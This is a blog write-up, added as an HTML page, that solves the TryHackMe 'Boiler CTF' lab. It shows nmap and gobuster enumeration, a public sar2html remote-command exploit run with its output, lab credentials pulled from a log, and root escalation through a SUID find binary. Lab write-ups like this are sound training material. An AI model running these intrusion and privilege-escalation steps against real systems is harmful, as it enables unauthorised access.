@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><link rel="icon" href="/favicon_main.svg"><meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta http-equiv="x-ua-compatible" content="ie=edge" /><meta property="og:url"  content="https://marianneharju.com/ctf/tryhackme/boiler_ctf/" />
+    <meta property="og:type" content="article" /><meta property="og:title" content="Boiler CTF - Writeup" /><meta property="og:description" content="Solving steps of Boiler CTF in TryHackMe" /><meta property="og:image:width"  content="600" />
+        <meta property="og:image:height" content="600" /><meta property="og:image" content="https://marianneharju.com/ctf/tryhackme/boiler_ctf/boiler_logo_huece60e1cedf5064c874deb46e14f6bf4_10865_600x0_resize_q75_box.jpeg" /><title>Personal website and blog - Boiler CTF - Writeup</title>
+
+    
+<link href="https://fonts.googleapis.com/css?family=Open&#43;Sans" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Open&#43;Sans" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Open&#43;Sans" rel="stylesheet"><link rel="stylesheet" type="text/css" href="/css/style.6fd7fa42c7b7fe49cfeceeed650d33cb8d1cdbfe842e514a22e57a6b712729aa.css" integrity="sha256-b9f6Qse3/knP7O7tZQ0zy40c2/6ELlFKIuV6a3EnKao=">
+<link rel="stylesheet" type="text/css" href="/css/monokai-sublime.9.15.8.min.91376415864fdd3a92be524052267afece4bdb1bb8c6c754f5e60c5ac28e93be.css" integrity="sha256-kTdkFYZP3TqSvlJAUiZ6/s5L2xu4xsdU9eYMWsKOk74=">
+<link rel="stylesheet" type="text/css" href="/css/all.min.2d91c07e15fc26f2697117b326256c0a2b0586dd12a15c622a53cd47a9e54a1d.css" integrity="sha256-LZHAfhX8JvJpcRezJiVsCisFht0SoVxiKlPNR6nlSh0=">
+<link rel="stylesheet" type="text/css" href="/css/refresh.ccfd23f8053a1571a3e474a6877f42a6a1924c6bbf1b64c7704b49a0353b4650.css" integrity="sha256-zP0j&#43;AU6FXGj5HSmh39CpqGSTGu/G2THcEtJoDU7RlA=">
+<link rel="stylesheet" type="text/css" href="/css/devicon.min.149016fbf45c8bc157d6f55ce3ee875feaa3f90446bf7d151fbc16a9f21a8859.css" integrity="sha256-FJAW&#43;/Rci8FX1vVc4&#43;6HX&#43;qj&#43;QRGv30VH7wWqfIaiFk=">
+    
+
+  </head>
+  <body>
+     
+
+    <div id="preloader">
+      <div id="status"></div>
+    </div><nav class="navbar is-fresh is-transparent no-shadow" role="navigation" aria-label="main navigation">
+  <div class="container">
+    <div class="navbar-brand">
+
+      
+      
+      
+      <a class="navbar-item">
+        <div class="menu-icon-wrapper left-menu-icon-wrapper" style="visibility: visible;">
+          <svg width="1000px" height="1000px">
+            <path class="path1" d="M 300 400 L 700 400 C 900 400 900 750 600 850 A 400 400 0 0 1 200 200 L 800 800"></path>
+            <path class="path2" d="M 300 500 L 700 500"></path>
+            <path class="path3" d="M 700 600 L 300 600 C 100 600 100 200 400 150 A 400 380 0 1 1 200 800 L 800 200"></path>
+          </svg>
+          <button id="menu-icon-trigger" class="menu-icon-trigger"></button>
+        </div>
+        <div class="navbar-item left-menu-icon-wrapper">
+          Tags
+        </div>
+      </a>
+
+      <div class="navbar-item is-expanded"></div>
+      <a class="navbar-item is-hidden-desktop">  
+        <div data-target="navbar-menu" class="navbar-item right-menu-icon-wrapper is-hidden-desktop">
+          Menu
+        </div>
+        <div data-target="navbar-menu" class="menu-icon-wrapper right-menu-icon-wrapper" style="visibility: visible;">
+          <svg width="1000px" height="1000px">
+            <path class="path1" d="M 300 400 L 700 400 C 900 400 900 750 600 850 A 400 400 0 0 1 200 200 L 800 800"></path>
+            <path class="path2" d="M 300 500 L 700 500"></path>
+            <path class="path3" d="M 700 600 L 300 600 C 100 600 100 200 400 150 A 400 380 0 1 1 200 800 L 800 200"></path>
+          </svg>
+          <button id="menu-icon-trigger" class="menu-icon-trigger"></button>
+        </div>
+      </a>
+    </div><div id="navbar-menu" class="navbar-menu is-static">
+      
+      <div class="navbar-end">
+        
+          <a href="/" class="navbar-item is-secondary">Home</a><a href="/about/" class="navbar-item is-secondary">About Me</a><a href="/ctf/" class="navbar-item is-secondary">CTF</a><a href="/owasp/" class="navbar-item is-secondary">OWASP TOP-10</a>
+        
+        
+        
+        
+        
+        
+        
+      </div>
+    </div>
+  </div>
+</nav>
+<nav id="navbar-clone" class="navbar is-fresh is-transparent" role="navigation" aria-label="main navigation">
+  <div class="container">
+      <div class="navbar-brand">
+  
+        
+        
+        
+        <a class="navbar-item">
+          <div class="menu-icon-wrapper left-menu-icon-wrapper" style="visibility: visible;">
+            <svg width="1000px" height="1000px">
+              <path class="path1" d="M 300 400 L 700 400 C 900 400 900 750 600 850 A 400 400 0 0 1 200 200 L 800 800"></path>
+              <path class="path2" d="M 300 500 L 700 500"></path>
+              <path class="path3" d="M 700 600 L 300 600 C 100 600 100 200 400 150 A 400 380 0 1 1 200 800 L 800 200"></path>
+            </svg>
+            <button id="menu-icon-trigger" class="menu-icon-trigger"></button>
+          </div>
+          <div class="navbar-item left-menu-icon-wrapper">
+            Tags
+          </div>
+        </a>
+  
+        <div class="navbar-item is-expanded"></div>
+        <a class="navbar-item is-hidden-desktop">  
+          <div data-target="cloned-navbar-menu" class="navbar-item right-menu-icon-wrapper is-hidden-desktop">
+            Menu
+          </div>
+          <div data-target="cloned-navbar-menu" class="menu-icon-wrapper right-menu-icon-wrapper" style="visibility: visible;">
+            <svg width="1000px" height="1000px">
+              <path class="path1" d="M 300 400 L 700 400 C 900 400 900 750 600 850 A 400 400 0 0 1 200 200 L 800 800"></path>
+              <path class="path2" d="M 300 500 L 700 500"></path>
+              <path class="path3" d="M 700 600 L 300 600 C 100 600 100 200 400 150 A 400 380 0 1 1 200 800 L 800 200"></path>
+            </svg>
+            <button id="menu-icon-trigger" class="menu-icon-trigger"></button>
+          </div>
+        </a>
+      </div><div id="cloned-navbar-menu" class="navbar-menu is-static">
+        <div class="navbar-end"><a href="/" class="navbar-item is-secondary">Home</a><a href="/about/" class="navbar-item is-secondary">About Me</a><a href="/ctf/" class="navbar-item is-secondary">CTF</a><a href="/owasp/" class="navbar-item is-secondary">OWASP TOP-10</a>
+          
+          
+          
+
+          
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </nav>
+<section class="section is-medium">
+  <div class="container">
+    <div class="columns">
+      <div class="column is-centered-tablet-portrait">
+        <h1 class="title is-2 section-title">Boiler CTF - Writeup</h1>
+        <h5 class="subtitle is-5 is-muted"></h5>
+        <div class="divider"></div>
+        
+        <section class="section content has-text-justified">
+          <p>Difficulty: <strong>Medium</strong></p>
+<p>Let&rsquo;s see how to solve this TryHackMe CTF.</p>
+<h3 id="port-scan">Port scan</h3>
+<p>To start with, let&rsquo;s run two port scans at the same time. The reason for doing two scans instead of only one is simple: if you scan just top ports, then you will get a result quickly but there&rsquo;s a chance you might miss some ports; if you scan all ports you will get a more thorough result but it takes a lot of time. So usually I do both! Starting with just top ports gives you a result quickly and you are able to immediately start working with the results of that first scan. When the other scan finishes, you can see if there were some ports that the first scan missed or not.</p>
+<ol>
+<li>Top 1000 ports:</li>
+</ol>
+<div class="columns is-centered container"><div class="column is-two-thirds"><pre><code class="code-highlight language-shell">nmap -sC -sV -vv [MACHINE_IP]</code></pre></div>
+</div>
+<p>Results:</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">PORT      STATE SERVICE REASON         VERSION
+21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.221.249
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp open  http    syn-ack ttl 64 MiniServ 1.930 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 445AD3A9DD9A168800FBCFC33905AA81
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: MiniServ/1.930
+|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).</code></pre></div>
+</div>
+<ol start="2">
+<li>All ports:</li>
+</ol>
+<div class="columns is-centered container"><div class="column is-two-thirds"><pre><code class="code-highlight language-shell">nmap -sC -sV -vv -p- [MACHINE_IP]</code></pre></div>
+</div>
+<p>Results:</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">PORT      STATE SERVICE REASON         VERSION
+21/tcp    open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.221.249
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp open  http    syn-ack ttl 64 MiniServ 1.930 (Webmin httpd)
+|_http-favicon: Unknown favicon MD5: 445AD3A9DD9A168800FBCFC33905AA81
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: MiniServ/1.930
+|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).
+55007/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
+|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB&#43;LwOEavTWG/pqxKLpk7oc=
+|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (EdDSA)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p</code></pre></div>
+</div>
+<p>As can be seen, the all-ports-scan gives us one more port, which is 55007 for ssh. Hmm&hellip; this might come in handy later. First, let&rsquo;s check out what can be done with the lower ports.</p>
+<h3 id="ftp">FTP</h3>
+<p>Anonymous login is allowed, so we&rsquo;re able to do so using <code>ftp [MACHINE_IP]</code> - after that we need to enter the username which is &ldquo;anonymous&rdquo;, and then we&rsquo;re logged in.</p>
+<p>With <code>ls -la</code> we are able to see a hidden file .info.txt. W can use <code>get .info.txt</code> to download the file into our machine, and it has the following content:</p>
+<pre tabindex="0"><code>Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
+</code></pre><p>It looks like some sort of a substitution cipher, so we can start from there. If you&rsquo;re not sure what you are doing, you can play around with some online tools and most likely one of those will lead you in the right direction. This particular cipher used here is ROT13 that replaces a letter with the 13th letter after it in the alphabet. It&rsquo;s easy and pretty common, so if you suspect it might be this one, then chances are that it is!  Below you can see how it works, and yes, if you are feeling extra bored, you can do it manually.</p>
+<p><img src="/Images/BoilerCTF_images/thm_boiler_01_01.png" alt=""></p>
+<p>This is the meaning of the content of .info.txt:</p>
+<pre tabindex="0"><code>Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
+</code></pre><p>So&hellip; nothing interesting here except for some knowledge about ROT13. Moving on.</p>
+<p>Next, I want to see if it&rsquo;s possible to upload files to ftp. I try doing that with a random file named something.txt, and nope, permission denied:</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">ftp&gt; put something.txt
+local: something.txt remote: something.txt
+200 PORT command successful. Consider using PASV.
+550 Permission denied.</code></pre></div>
+</div>
+<p>It seems that there is not much else to do with ftp so let&rsquo;s move on to port 80.</p>
+<h3 id="http-directory-enumeration">HTTP directory enumeration</h3>
+<p>For enumerating directories we can use gobuster.</p>
+<pre tabindex="0"><code>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://[MACHINE_IP]
+</code></pre><p>Results:</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/index.html (Status: 200)
+/joomla (Status: 301)
+/manual (Status: 301)
+/robots.txt (Status: 200)
+/server-status (Status: 403)</code></pre></div>
+</div>
+<p>After taking a look at these directories, it seems that /joomla is where the magic happens. For those who may not know, Joomla is an open-source content management system for publishing web content on websites.</p>
+<p>Next, let&rsquo;s see what subdirectories there are under /joomla:</p>
+<pre tabindex="0"><code>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://[MACHINE_IP]/joomla
+</code></pre><p>Results:</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/_archive (Status: 301)
+/_database (Status: 301)
+/_files (Status: 301)
+/_test (Status: 301)
+/~www (Status: 301)
+/administrator (Status: 301)
+/bin (Status: 301)
+/build (Status: 301)
+/cache (Status: 301)
+/components (Status: 301)
+/images (Status: 301)
+/includes (Status: 301)
+/installation (Status: 301)
+/language (Status: 301)
+/layouts (Status: 301)
+/libraries (Status: 301)
+/media (Status: 301)
+/modules (Status: 301)
+/plugins (Status: 301)
+/templates (Status: 301)
+/tests (Status: 301)
+/tmp (Status: 301)
+/index.php (Status: 200)</code></pre></div>
+</div>
+<p>Now for the fun part: falling into a thousand rabbit holes that don&rsquo;t lead anywhere.</p>
+<p><img src="/Images/BoilerCTF_images/thm_boiler_01_02.gif" alt=""></p>
+<h3 id="sar2html">Sar2html</h3>
+<p>But fear not, there is a way out! Under  <code>/joomla/_test</code>  we find sar2html for which we can use <a href="https://github.com/AssassinUKG/sar2HTML">this fun exploit</a> :</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">python3 sar2HTMLshell.py -ip [MACHINE_IP]/joomla/_test
+                _____  _   _ ________  ___ _     
+               / __  \| | | |_   _|  \/  || |    
+ ___  __ _ _ __`&#39; / /&#39;| |_| | | | | .  . || |    
+/ __|/ _` | &#39;__| / /  |  _  | | | | |\/| || |    
+\__ \ (_| | |  ./ /___| | | | | | | |  | || |____
+|___/\__,_|_|  \_____/\_| |_/ \_/ \_|  |_/\_____/
+                                                 
+                                                 
+The Host Appears Vulnerable, Running a basic shell ...
+Enter: &#39;rs session&#39; for a ReverseShell
+$\cmd&gt; ls
+------- Results -------
+HPUX
+Linux
+SunOS
+index.php
+log.txt
+sar2html
+sarFILE
+$\cmd&gt; cat log.txt
+------- Results -------
+HPUX
+Linux
+SunOS
+Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
+Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
+Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
+Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
+Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
+Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
+Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
+Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.</code></pre></div>
+</div>
+<p>Now we finally have some credentials:</p>
+<p><code>basterd:superduperp@$$</code></p>
+<p>Very superduper for us, not so much for poor basterd.</p>
+<h3 id="ssh">SSH</h3>
+<p>Remember that ssh port? Now&rsquo;s the time! Let&rsquo;s use the credentials to log in via ssh:</p>
+<p><code>ssh -p 55007 basterd@[MACHINE_IP]</code></p>
+<p>After this we need to enter the password, et voilà, we are in and it&rsquo;s time to look around.</p>
+<p>Having logged in as basterd, we find a file named backup.sh in /home/basterd that contains the credentials of another user:</p>
+<p><code>stoner:superduperp@$$no1knows</code></p>
+<p>Very superduper for us, not so much for poor stoner.</p>
+<h3 id="privilege-escalation">Privilege escalation</h3>
+<p>Let&rsquo;s use these credentials to log in as stoner. First, there&rsquo;s an interesting-looking hidden file that says something along the lines of &ldquo;close, but no cigar&rdquo; so we can&rsquo;t really do anything with it, but it does provide the answer to one of the questions in the room.</p>
+<p>Next, let&rsquo;s try to find ways for privilege escalation.  One of the things I always check out is files with SUID bit set. Here it gives us the following result:</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">stoner@Vulnerable:~$ find / -type f -perm -04000 -ls 2&gt;/dev/null
+   264453     40 -rwsr-xr-x   1 root     root        38900 Mar 26  2019 /bin/su
+   276977     32 -rwsr-xr-x   1 root     root        30112 Jul 12  2016 /bin/fusermount
+   260151     28 -rwsr-xr-x   1 root     root        26492 May 15  2019 /bin/umount
+   260156     36 -rwsr-xr-x   1 root     root        34812 May 15  2019 /bin/mount
+   260172     44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6
+   260171     40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping
+   394226     16 -rwsr-xr-x   1 root     root        13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+   416088     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
+   416085     16 -rwsr-xr--   1 root     www-data    13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
+   260101     48 -rwsr-xr--   1 root     messagebus    46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   264108    504 -rwsr-xr-x   1 root     root         513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
+   260699      8 -rwsr-xr-x   1 root     root           5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+   265132     36 -rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newgidmap
+   260428    228 -r-sr-xr-x   1 root     root         232196 Feb  8  2016 /usr/bin/find
+   278157     52 -rwsr-sr-x   1 daemon   daemon        50748 Jan 15  2016 /usr/bin/at
+   263308     40 -rwsr-xr-x   1 root     root          39560 Mar 26  2019 /usr/bin/chsh
+   263304     76 -rwsr-xr-x   1 root     root          74280 Mar 26  2019 /usr/bin/chfn
+   263305     52 -rwsr-xr-x   1 root     root          53128 Mar 26  2019 /usr/bin/passwd
+   260641     36 -rwsr-xr-x   1 root     root          34680 Mar 26  2019 /usr/bin/newgrp
+   263253    160 -rwsr-xr-x   1 root     root         159852 Jun 11  2019 /usr/bin/sudo
+   264477     20 -rwsr-xr-x   1 root     root          18216 Mar 27  2019 /usr/bin/pkexec
+   263306     80 -rwsr-xr-x   1 root     root          78012 Mar 26  2019 /usr/bin/gpasswd
+   265133     36 -rwsr-xr-x   1 root     root          36288 Mar 26  2019 /usr/bin/newuidmap</code></pre></div>
+</div>
+<p>Time to consult our good friend <a href="https://gtfobins.github.io/">gtfobins</a> !</p>
+<p>It looks like we may be able to use /usr/bin/find for privilege escalation. After messing around with what gtfobins suggests and other information I can find, the command that works for me is:</p>
+<p><code>find -exec /bin/bash -p \;</code></p>
+<p>This sets euid as root.</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">stoner@Vulnerable:~$ id
+uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+stoner@Vulnerable:~$ find -exec /bin/bash -p \;
+bash-4.3# id
+uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</code></pre></div>
+</div>
+<p>And now we are able to access /root/root.txt!</p>
+<div class="columns is-centered container"><div class="column is-full"><pre><code class="code-highlight language-shell">
+bash-4.3# cat root.txt
+It wasn&#39;t that hard, was it?</code></pre></div>
+</div>
+<p>That&rsquo;s it, go grab a beverage of your choice!</p>
+<p><img src="/Images/BoilerCTF_images/thm_boiler_01_03.gif" alt=""></p>
+
+        </section>
+      </div>
+    </div>
+  </div>  
+  </section>
+<footer class="footer footer-dark">
+  <div class="container">
+    <div class="columns">
+      <div class="column">
+        <img src="/images/mh_logo.png" alt="">
+        
+      </div>
+      
+    <div class="column">
+        <div class="footer-column">
+          <div class="footer-header">
+              <h3>Website</h3>
+          </div>
+          <ul class="link-list"><li></li>
+            <li><a href="/tags/">
+                <span class="icon"><i class="fa fa-tag"></i></span> 
+                All Tags
+              </a></li>
+          </ul>
+        </div>
+      </div>
+    
+      
+      <div class="column">
+        <div class="footer-column">
+          <div class="footer-header">
+              <h3>Contacts</h3>
+          </div>
+          <ul class="link-list">
+            
+            <li>
+              <a href="https://www.linkedin.com/in/marianne-harju-a80368260/" target="_blank">
+                <span class="icon"><i class="fab fa-linkedin"></i></span>
+                
+                  My LinkedIn
+                
+              </a>
+            </li>
+            
+                         
+            
+            <li>
+              <a href="mailto:name.surname@domain.com" target="_blank">
+                <span class="icon"><i class="fa fa-envelope"></i></span>
+                
+                  My Email
+                
+              </a>
+            </li>
+            
+                   
+                   
+            
+            
+                         
+       
+          </ul>
+        </div>
+      </div>
+      
+
+      
+      <div class="column">
+        <div class="footer-column">
+          <div class="footer-header">
+              <h3>Copyright</h3>
+          </div>
+          <ul class="link-list">
+            <li>
+              <a>
+                <span class="icon"><i class="fa fa-copyright"></i></span>
+                Maru - 2023
+              </a>
+            </li>
+          </ul>
+        </div>
+      </div>
+      
+
+    </div>
+  </div>
+</footer>
+    <div id="backtotop"><a href="#"></a></div><div class="sidebar scroll">
+  <div class="sidebar-header"><img src="/sidebar.svg" alt="">
+    
+    <a class="sidebar-close" href="javascript:void(0);">
+      <i data-feather="x"></i>
+    </a>
+  </div>
+  <div class="inner">
+    <ul class="sidebar-menu">
+      <li class="no-children"><a href="/tags/"><div class="columns">
+              <table width="100%">  
+                <tr>
+                  <td class="">
+                    <span class="icon"><i class="fa fa-cubes"></i></span>
+                    All Tags
+                  </td>
+                  <td class="has-text-right" >
+                      
+                  </td>
+                </tr>
+              </table>
+            </div>
+          </a>
+      <li class="no-children">
+          <a href="/tags/portswigger-labs">
+            <div class="columns">
+              
+              <table width="100%">  
+                  <tr>
+                    <td class=""><span class="icon"><i class="fa fa-cube"></i></span>PortSwigger Labs</td>
+                    <td class="has-text-right" >
+                        <div class="tag-number">8</div>
+                      
+                    </td>
+                    
+                  </tr>
+              </table>
+              
+            </div>
+          </a>
+      </li>
+      <li class="no-children">
+          <a href="/tags/xss">
+            <div class="columns">
+              
+              <table width="100%">  
+                  <tr>
+                    <td class=""><span class="icon"><i class="fa fa-cube"></i></span>XSS</td>
+                    <td class="has-text-right" >
+                        <div class="tag-number">4</div>
+                      
+                    </td>
+                    
+                  </tr>
+              </table>
+              
+            </div>
+          </a>
+      </li>
+      <li class="no-children">
+          <a href="/tags/xxe">
+            <div class="columns">
+              
+              <table width="100%">  
+                  <tr>
+                    <td class=""><span class="icon"><i class="fa fa-cube"></i></span>XXE</td>
+                    <td class="has-text-right" >
+                        <div class="tag-number">2</div>
+                      
+                    </td>
+                    
+                  </tr>
+              </table>
+              
+            </div>
+          </a>
+      </li>
+      <li class="no-children">
+          <a href="/tags/ctf">
+            <div class="columns">
+              
+              <table width="100%">  
+                  <tr>
+                    <td class=""><span class="icon"><i class="fa fa-cube"></i></span>CTF</td>
+                    <td class="has-text-right" >
+                        <div class="tag-number">1</div>
+                      
+                    </td>
+                    
+                  </tr>
+              </table>
+              
+            </div>
+          </a>
+      </li>
+      <li class="no-children">
+          <a href="/tags/file-upload-issues">
+            <div class="columns">
+              
+              <table width="100%">  
+                  <tr>
+                    <td class=""><span class="icon"><i class="fa fa-cube"></i></span>File Upload Issues</td>
+                    <td class="has-text-right" >
+                        <div class="tag-number">1</div>
+                      
+                    </td>
+                    
+                  </tr>
+              </table>
+              
+            </div>
+          </a>
+      </li>
+      <li class="no-children">
+          <a href="/tags/ssrf">
+            <div class="columns">
+              
+              <table width="100%">  
+                  <tr>
+                    <td class=""><span class="icon"><i class="fa fa-cube"></i></span>SSRF</td>
+                    <td class="has-text-right" >
+                        <div class="tag-number">1</div>
+                      
+                    </td>
+                    
+                  </tr>
+              </table>
+              
+            </div>
+          </a>
+      </li>
+      <li class="no-children">
+          <a href="/tags/tryhackme">
+            <div class="columns">
+              
+              <table width="100%">  
+                  <tr>
+                    <td class=""><span class="icon"><i class="fa fa-cube"></i></span>TryHackMe</td>
+                    <td class="has-text-right" >
+                        <div class="tag-number">1</div>
+                      
+                    </td>
+                    
+                  </tr>
+              </table>
+              
+            </div>
+          </a>
+      </li></ul>
+  </div>
+</div>
+<script src="/js/jquery-2.2.4.893e90f6230962e42231635df650f20544ad22affc3ee396df768eaa6bc5a6a2.js" integrity="sha256-iT6Q9iMJYuQiMWNd9lDyBUStIq/8PuOW33aOqmvFpqI="></script>
+  <script src="/js/feather.4.22.0.1ab07abeb9975f283f6b5f29451981be680fbf77ea778f991d457511d210476a.js" integrity="sha256-GrB6vrmXXyg/a18pRRmBvmgPv3fqd4&#43;ZHUV1EdIQR2o="></script>
+  <script src="/js/modernizr-3.6.0.e013a1e54e3c19d83537ba42b900d34451e5e4b2e789be27a02ac9b152edb741.js" integrity="sha256-4BOh5U48Gdg1N7pCuQDTRFHl5LLnib4noCrJsVLtt0E="></script>
+  <script src="/js/refresh.62c1a9b7d85bcf4d944cd585a01dfa8fb15112a7d2cf9fb819db20493bfe7484.js" integrity="sha256-YsGpt9hbz02UTNWFoB36j7FREqfSz5&#43;4GdsgSTv&#43;dIQ="></script><script>
+  window.MathJax = {
+    loader: {
+      load: ['core', 'input/tex-base', 'output/chtml'],  
+      source: {
+        'core': '\/js\/mathjax\/core.d48fedf25c74c54fa6bf79646de92b02155872bdc4f5f7d0bbfc662523d8b4f5.js',
+        'input/tex-base': '\/js\/mathjax\/tex-base.1b68b8741dfc54e8f7222f88bea8ffcfc57ac54b2a2d8f4edf6800aa44d49441.js',
+        'output/chtml': '\/js\/mathjax\/chtml.926cd166e0f8c1f8a566a718d60c9c58a2b7142b156d30d5f02cec7c3b0ad60a.js',
+        'output/chtml/fonts/tex': '\/js\/mathjax\/tex_out.b8b2bb939c0dae84bf1390bfe6d32af13e83f647cdac01d544d2a7a517477e9d.js'
+      },
+    },
+    chtml: {
+      fontURL: '/fonts' 
+    },
+  };
+</script><script src="/js/mathjax/startup.234a2513e6bdbc1eee06ca19abceca30fe4034e82afb373c08274c1ba2feb1a6.js" integrity="sha256-I0olE&#43;a9vB7uBsoZq87KMP5ANOgq&#43;zc8CCdMG6L&#43;saY="></script>
+  <script src="/js/highlight.9.18.1.b1c58829c55afcc1f568022af4b08ed8976da404d2990b7535bd8e19c0e3310c.js" integrity="sha256-scWIKcVa/MH1aAIq9LCO2JdtpATSmQt1Nb2OGcDjMQw="></script>
+  <script src="/js/highlightjs-line-numbers.2.7.0.min.ddfe282e07b7ec1ed069c23f92c7c8216ddb3f1879c4e962d37fd52adbd15a05.js" integrity="sha256-3f4oLge37B7QacI/ksfIIW3bPxh5xOli03/VKtvRWgU="></script><script>
+  hljs.initHighlightingOnLoad();
+  hljs.initLineNumbersOnLoad();
+  document.addEventListener('DOMContentLoaded', (event) => {
+    document.querySelectorAll('.codeinline').forEach((block) => {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+</body>
+</html>
